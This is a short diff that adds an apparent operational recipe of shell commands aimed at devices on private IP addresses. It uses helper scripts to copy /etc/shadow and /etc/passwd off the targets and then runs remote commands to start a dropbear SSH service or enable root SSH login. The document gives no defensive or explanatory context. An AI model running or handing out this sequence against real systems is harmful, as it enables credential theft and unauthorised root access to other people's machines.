@@ -1,0 +1,8 @@
+1.  ./post.pl -i 10.220.233.229 -ro -f /etc/shadow -o ./shadow
+2.  ./post.pl -i 10.220.232.20 -ro -f /etc/passwd -o ./passwd
+3.  ./remotecmd.pl -i 10.220.232.20 "systemctl start dropbear.service"
+
+OR
+    ./remotecmd.pl -i 10.220.232.20 "/usr/bin/sshEnable root"
+
+
